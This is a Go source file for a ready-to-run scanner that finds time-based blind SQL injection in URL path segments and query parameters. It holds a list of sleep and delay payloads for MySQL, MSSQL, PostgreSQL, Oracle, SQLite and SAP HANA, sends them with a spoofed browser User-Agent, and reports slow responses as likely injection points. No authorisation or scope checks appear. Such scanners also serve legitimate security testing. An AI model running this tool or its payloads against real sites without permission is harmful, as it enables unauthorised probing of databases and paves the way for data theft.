package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type Payload struct {
	DBType     string
	RawPayload string
	Delay      time.Duration
}

var (
	payloads = []Payload{
		{"MySQL", "' AND SLEEP(5) -- ", 5 * time.Second},
		{"MySQL", "XOR(if(now()=sysdate(),sleep(5),0))XOR'Z", 5 * time.Second},
		{"MSSQL", "'; WAITFOR DELAY '0:0:5' -- ", 5 * time.Second},
		{"PostgreSQL", "'; SELECT pg_sleep(5) -- ", 5 * time.Second},
		{"Oracle", "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- ", 5 * time.Second},
		{"SQLite", "' OR randomblob(1000000000) -- ", 5 * time.Second},
		{"SAP HANA", "'; SELECT SLEEP(5) -- ", 5 * time.Second},
		{"Generic", "' OR 1234=1234; WAITFOR DELAY '0:0:5' -- ", 5 * time.Second},
	}
	verbose    bool
	outputFile *os.File
	fileMu     sync.Mutex
)

func main() {
	var output string
	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
	flag.StringVar(&output, "o", "", "Output file to save results")
	flag.Parse()

	if output != "" {
		f, err := os.OpenFile(output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error opening output file: %v\n", err)
			os.Exit(1)
		}
		outputFile = f
		defer outputFile.Close()
	}

	var wg sync.WaitGroup
	concurrency := 10
	sem := make(chan struct{}, concurrency)

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        concurrency,
			IdleConnTimeout:     30 * time.Second,
			DisableCompression:  true,
			DisableKeepAlives:   false,
			MaxIdleConnsPerHost: concurrency,
		},
	}

	sc := bufio.NewScanner(os.Stdin)
	for sc.Scan() {
		rawURL := sc.Text()
		u, err := url.Parse(rawURL)
		if err != nil {
			fmt.Printf("Error parsing URL %s: %v\n", rawURL, err)
			continue
		}

		processURL(u, client, &wg, sem)
	}

	wg.Wait()
	if err := sc.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "Error reading input: %v\n", err)
	}
}

func processURL(u *url.URL, client *http.Client, wg *sync.WaitGroup, sem chan struct{}) {
	path := strings.Trim(u.Path, "/")
	pathSegments := strings.Split(path, "/")

	for i := range pathSegments {
		for _, payload := range payloads {
			wg.Add(1)
			go func(u *url.URL, segments []string, idx int, payload Payload) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				modified := make([]string, len(segments))
				copy(modified, segments)
				modified[idx] += payload.RawPayload
				newPath := "/" + strings.Join(modified, "/")
				if strings.HasSuffix(u.Path, "/") && !strings.HasSuffix(newPath, "/") {
					newPath += "/"
				}

				newU := u.ResolveReference(&url.URL{Path: newPath, RawQuery: u.RawQuery})
				testInjection(client, newU.String(), payload)
			}(u, pathSegments, i, payload)
		}
	}

	query := u.Query()
	for key := range query {
		values := query[key]
		for valIdx := range values {
			for _, payload := range payloads {
				wg.Add(1)
				go func(u *url.URL, key string, values []string, valIdx int, payload Payload) {
					defer wg.Done()
					sem <- struct{}{}
					defer func() { <-sem }()

					modifiedVals := make([]string, len(values))
					copy(modifiedVals, values)
					modifiedVals[valIdx] += payload.RawPayload
					newQuery := u.Query()
					newQuery[key] = modifiedVals

					newU := u.ResolveReference(&url.URL{
						Path:     u.Path,
						RawQuery: newQuery.Encode(),
					})
					testInjection(client, newU.String(), payload)
				}(u, key, values, valIdx, payload)
			}
		}
	}
}

func testInjection(client *http.Client, testURL string, payload Payload) {
	if verbose {
		fmt.Printf("[*] Testing URL: %s\n", testURL)
	}

	start := time.Now()
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		if verbose {
			fmt.Printf("[-] Error creating request for %s: %v\n", testURL, err)
		}
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.1")
	resp, err := client.Do(req)
	duration := time.Since(start)

	if err != nil {
		if verbose {
			fmt.Printf("[-] Error requesting %s: %v\n", testURL, err)
		}
		return
	}
	defer resp.Body.Close()

	if verbose {
		fmt.Printf("[*] Received %d from %s (time: %s)\n",
			resp.StatusCode, testURL, duration.Round(time.Millisecond))
	}

	threshold := payload.Delay * 9 / 10 // 90% of expected delay
	if duration >= threshold {
		msg := fmt.Sprintf("[+] Potential %s SQLi at %s (response time: %s)\n",
			payload.DBType, testURL, duration.Round(time.Millisecond))
		
		fmt.Print(msg)
		if outputFile != nil {
			fileMu.Lock()
			defer fileMu.Unlock()
			fmt.Fprint(outputFile, msg)
		}
	}
}
